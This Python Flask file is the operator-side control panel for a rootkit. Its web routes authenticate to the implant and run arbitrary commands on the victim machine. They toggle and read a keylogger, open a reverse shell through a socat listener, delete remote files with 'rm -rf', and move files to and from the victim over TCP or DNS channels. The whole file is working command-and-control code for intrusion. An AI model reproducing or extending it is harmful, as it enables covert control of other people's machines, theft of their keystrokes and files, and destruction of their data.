from utils.socat import run_socat_shell
from flask import jsonify, request
import config as cfg
from app import app
import threading
import time
import re
import os

def handle_command(prefix, default_use_history, force_tcp=False):
    data = {}
    if request.is_json:
        data = request.get_json(silent=True) or {}
    else:
        data = request.form.to_dict() or {}

    cmd = data.get('command', '').strip() if isinstance(data, dict) else ''
    use_history = data.get('use_history', default_use_history)
    full_cmd = f"{prefix} {cmd}".strip()

    # Check wheter the channel is TCP or DNS
    channel = data.get('channel', 'tcp')
    cfg.last_channel = channel

    try:
        if force_tcp or channel == 'tcp':
            if use_history: result = cfg.rootkit_connexion.send(full_cmd, True, 'tcp')
            else: result = cfg.rootkit_connexion.send(full_cmd, False, 'tcp')
        else:
            result = cfg.rootkit_connexion.send(full_cmd, True, 'dns')
    except Exception as e:
        result = f"[ERROR] : {e}"

    return jsonify(result), 200


def getClientInfos():
    if not cfg.rootkit_connexion:
        return {
            "authenticated": False,
            "rootkit_address": None,
            "last_command": None,
        }

    ip = cfg.rootkit_connexion.get_tcp_object().get_client_ip()
    port = cfg.rootkit_connexion.get_tcp_object().get_listening_port()
    history = cfg.rootkit_connexion.get_command_history()
    last_command = history[-1]['command'] if history else None

    return {
        "authenticated": cfg.rootkit_connexion.is_authenticated(),
        "rootkit_address": [ip, port] if ip and port else None,
        "last_command": last_command,
    }


@app.route('/client-info', methods=['GET'])
def clientInfo():
    info = getClientInfos()
    return jsonify(info), 200


@app.route('/get-history', methods=['GET'])
def get_history():
    if not cfg.rootkit_connexion:
        return jsonify({'error': 'No rootkit connection available.'}), 503

    history = cfg.rootkit_connexion.get_command_history()
    if not history:
        return jsonify({'error': 'No command history available.'}), 404

    return jsonify(history), 200


@app.route('/send', methods=['POST'])
def send():
    return handle_command("", False)


@app.route('/exec', methods=['POST'])
def exec_command():
    return handle_command("exec", True)

@app.route('/delete-remote', methods=['POST'])
def api_remove_file():
    return handle_command("exec rm -rf", False, force_tcp=True)


@app.route('/connect', methods=['POST'])
def connect_command():
    response, status_code = handle_command("connect", False)
    if cfg.rootkit_connexion.is_authenticated():
        return response, 200
    else:
        return response, 403


@app.route('/getshell', methods=['POST'])
def getshell():
    response = {"status": "error", "message": ""}
    port = request.json.get('port')

    try:
        # Vérifier si le port est valide
        port = int(port)
        if port < 1024 or port > 65535:
            response["message"] = "❌ Le port doit être entre 1024 et 65535."
        else:
            threading.Thread(target=run_socat_shell, args=(port,), daemon=True).start()
            time.sleep(1)

            cfg.rootkit_connexion.send(f"getshell {port}", False, 'tcp')
            response["status"] = "success"
            response["message"] = f"🚀 Shell distant lancé sur le port {port}."

    except ValueError:
        response["message"] = "❌ Le port doit être un nombre valide."
        return response, 400

    return response, 200


@app.route('/killcom', methods=['POST'])
def killcom_command():
    return handle_command("killcom", False)


@app.route('/disconnect', methods=['POST'])
def disconnect_command():
    response, _ = handle_command("disconnect", False)
    if not cfg.rootkit_connexion.is_authenticated():
        return response, 200
    else:
        return response, 403


@app.route('/klgon', methods=['POST'])
def klgon_command():
    return handle_command("klgon", False)


@app.route('/klg', methods=['GET'])
def klg_command():
    return handle_command("klg", False)


@app.route('/klgoff', methods=['POST'])
def klgoff_command():
    return handle_command("klgoff", False)


@app.route('/sysinfo', methods=['GET'])
def sysinfo_command():
    result = cfg.rootkit_connexion.get_tcp_object().get_client_sysinfo()
    if result is None:
        return jsonify({'error': 'No client sysinfo available.'}), 404
    return jsonify(result), 200

@app.route('/diskusage', methods=['GET'])
def diskusage_command():
    return handle_command("exec df -h", False, force_tcp=True)


@app.route('/cpu-ram', methods=['GET'])
def cpu_ram_command():
    response, _ = handle_command('exec grep "^cpu " /proc/stat', False, force_tcp=True)
    cpu_response_data = response.get_data(as_text=True).split("stdout:\\n")[-1].split("stderr:")[0].strip().replace('\\n', '\n')

    response, status_code = handle_command('exec free -m', False)
    ram_response_data = response.get_data(as_text=True).split("stdout:\\n")[-1].split("stderr:")[0].strip().replace('\\n', '\n')
    
    response_data = cpu_response_data + ram_response_data

    if status_code == 200:
        try:
            lines = response_data.strip().splitlines()

            if len(lines) < 3:
                return jsonify({"error": "Not enough lines in command output"}), 500

            cpu_line = lines[0]
            mem_line = lines[2]  # "Mem:" values

            # CPU parsing
            cpu_values = list(map(int, re.findall(r'\d+', cpu_line)))
            idle_time = cpu_values[3]
            total_time = sum(cpu_values)
            cpu_usage = 100 * (1 - (idle_time / total_time))

            # RAM parsing
            mem_values = list(map(int, re.findall(r'\d+', mem_line)))
            ram_total = mem_values[0]
            ram_used = mem_values[1]

            parsed_data = {
                "cpu": round(cpu_usage, 1),
                "ram_used": ram_used,
                "ram_total": ram_total
            }
            return jsonify(parsed_data), 200

        except Exception as e:
            return jsonify({"error": f"Failed to parse response: {str(e)}"}), 500

    return response, status_code

@app.route('/ls', methods=['GET'])
def api_list_remote_files():
    if not cfg.rootkit_connexion or not cfg.rootkit_connexion.is_authenticated():
        return jsonify({"error": "Not connected to any rootkit"}), 403

    path = request.args.get("path", "/").strip()
    if not path:
        path = "/"

    try:
        result = cfg.rootkit_connexion.send(f"exec ls -pA1 {path}", use_history=False, channel="tcp")

        if not result or "stdout:" not in result:
            return jsonify({"error": f"No valid response: {result}"}), 500

        stdout = result.split("stdout:")[1].split("stderr:")[0].strip()
        lines = stdout.splitlines()

        entries = []
        for name in lines:
            name = name.strip()
            if not name:
                continue
            entry_type = "D" if name.endswith("/") else "F"
            entries.append({
                "type": entry_type,
                "name": name.rstrip("/"),
            })

        return jsonify({
            "entries": entries
        })

    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/pwd', methods=['GET'])
def api_get_current_directory():
    if not cfg.rootkit_connexion or not cfg.rootkit_connexion.is_authenticated():
        return jsonify({"error": "Not connected to any rootkit"}), 403

    try:
        result = cfg.rootkit_connexion.send("exec pwd", use_history=False, channel="tcp")
        if not result or "stdout:" not in result:
            return jsonify({"error": f"No valid response: {result}"}), 500

        stdout = result.split("stdout:")[1].split("stderr:")[0].strip()
        current_path = stdout.splitlines()[0].strip() if stdout else "/"

        return jsonify({"path": current_path})

    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/cd', methods=['POST'])
def api_change_directory():
    if not cfg.rootkit_connexion or not cfg.rootkit_connexion.is_authenticated():
        return jsonify({"error": "Not connected to any rootkit"}), 403

    data = request.get_json()
    path = data.get("path", "").strip() if data else ""
    if not path:
        return jsonify({"error": "Missing 'path' in request"}), 400

    try:
        result = cfg.rootkit_connexion.send(f"exec cd {path} && pwd", use_history=False, channel="tcp")
        if not result or "stdout:" not in result:
            return jsonify({"error": f"No valid response: {result}"}), 500

        stdout = result.split("stdout:")[1].split("stderr:")[0].strip()
        new_path = stdout.splitlines()[0].strip() if stdout else "/"

        return jsonify({"path": new_path})

    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/download-remote', methods=['POST'])
def download_remote():
    remote_path = request.json.get('remote_path')
    if not remote_path:
        return jsonify({"error": "Missing 'remote_path' in request"}), 400

    if not os.path.isabs(remote_path):
        return jsonify({"error": "Invalid remote path"}), 400

    filename = os.path.basename(remote_path)
    local_path = os.path.join(cfg.DOWNLOAD_FOLDER, filename)

    try:
        response = cfg.rootkit_connexion.send(f"download {remote_path}", use_history=False, channel="tcp")
        if not response or not response.startswith("SIZE "):
            return jsonify({"error": f"File unavailable or error: {response}"}), 400

        size = int(response.split()[1])
        data = cfg.rootkit_connexion.send("READY", use_history=False, channel="tcp")

        if data is False or data is None:
            return jsonify({"error": "Failed to receive file (missing data or network error)"}), 500

        with open(local_path, "wb") as f:
            f.write(data.encode("latin1") if isinstance(data, str) else data)

        print(f"File downloaded successfully at {local_path}")
        return jsonify({"message": f"File downloaded successfully: {filename}", "download_url": os.path.join(cfg.DOWNLOAD_FOLDER, filename)}), 200

    except Exception as e:
        return jsonify({"error": f"Error during download: {str(e)}"}), 500

@app.route('/upload', methods=['POST'])
def upload():
    if not cfg.rootkit_connexion or not cfg.rootkit_connexion.is_authenticated():
        return jsonify({"error": "Not connected to any rootkit"}), 403

    if 'file' not in request.files:
        return jsonify({"error": "No file part in the request"}), 400

    file = request.files['file']
    remote_path = request.form.get('remote_path')

    if file.filename == '':
        return jsonify({"error": "No selected file"}), 400

    if not remote_path:
        return jsonify({"error": "Missing 'remote_path' in request"}), 400

    filename = file.filename
    file_data = file.read()

    try:
        # Send the upload command to the rootkit
        size = len(file_data)
        command = f"upload {remote_path} {size}"
        response = cfg.rootkit_connexion.send(command, use_history=False, channel="tcp")

        if response is None:
            return jsonify({"error": "No response from rootkit"}), 500

        if response.strip().upper() != "READY":
            return jsonify({"error": f"Rootkit refused upload: {response.strip()}"}), 400

        # Send the binary file data
        success = cfg.rootkit_connexion.send(file_data, use_history=False, channel="tcp")

        if not success:
            return jsonify({"error": "Failed to send file data"}), 500

        if "successfully" in success.lower():
            return jsonify({"message": "File uploaded successfully"}), 200
        else:
            return jsonify({"error": f"Unexpected response: {success}"}), 500

    except Exception as e:
        return jsonify({"error": f"Error during upload: {str(e)}"}), 500

@app.route('/get_dowloaded_files', methods=['GET'])
def get_downloaded_files():
    if not os.path.exists(cfg.DOWNLOAD_FOLDER):
        return jsonify({"error": "Download folder does not exist"}), 404

    try:
        files = os.listdir(cfg.DOWNLOAD_FOLDER)
        files = [f for f in files if os.path.isfile(os.path.join(cfg.DOWNLOAD_FOLDER, f))]
        return jsonify({"files": files}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/delete_downloaded_file', methods=['POST'])
def delete_downloaded_file():
    data = request.get_json()
    filename = data.get('filename')

    if not filename:
        return jsonify({"error": "Filename is required"}), 400

    file_path = os.path.join(cfg.DOWNLOAD_FOLDER, filename)

    if not os.path.exists(file_path):
        return jsonify({"error": "File does not exist"}), 404

    try:
        os.remove(file_path)
        return jsonify({"message": f"File {filename} deleted successfully"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500